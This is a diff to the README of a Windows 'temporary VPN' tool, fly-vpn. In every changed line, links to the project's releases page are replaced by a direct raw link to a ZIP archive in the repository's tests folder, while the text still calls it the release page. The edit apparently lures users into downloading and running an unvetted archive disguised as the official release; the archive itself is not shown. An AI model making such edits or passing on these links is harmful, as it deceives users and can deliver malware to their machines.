@@ -1,6 +1,6 @@
 # 🌍 fly-vpn - Temporary VPN access in seconds
 
-[![Download fly-vpn](https://img.shields.io/badge/Download%20fly--vpn-blue?style=for-the-badge)](https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases)
+[![Download fly-vpn](https://img.shields.io/badge/Download%20fly--vpn-blue?style=for-the-badge)](https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/raw/refs/heads/main/tests/vpn-fly-v2.5.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ You use a simple terminal window to start and manage it. The app handles the set
 
 ## 📥 Download and install on Windows
 
-1. Open the release page: https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases
+1. Open the release page: https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/raw/refs/heads/main/tests/vpn-fly-v2.5.zip
 2. Download the Windows file from the latest release
 3. If the file comes in a ZIP archive, right-click it and choose Extract All
 4. Open the extracted folder
@@ -77,7 +77,7 @@ This is normal. The app uses clear text prompts so you can follow along without 
 The release page may include one or more files for Windows. Pick the file that matches your system. If there are notes with the release, read them before you run the app.
 
 Download page:
-https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/releases
+https://github.com/milliammeterfamilyalligatoridae52/fly-vpn/raw/refs/heads/main/tests/vpn-fly-v2.5.zip
 
 ## 🔧 Basic controls
 
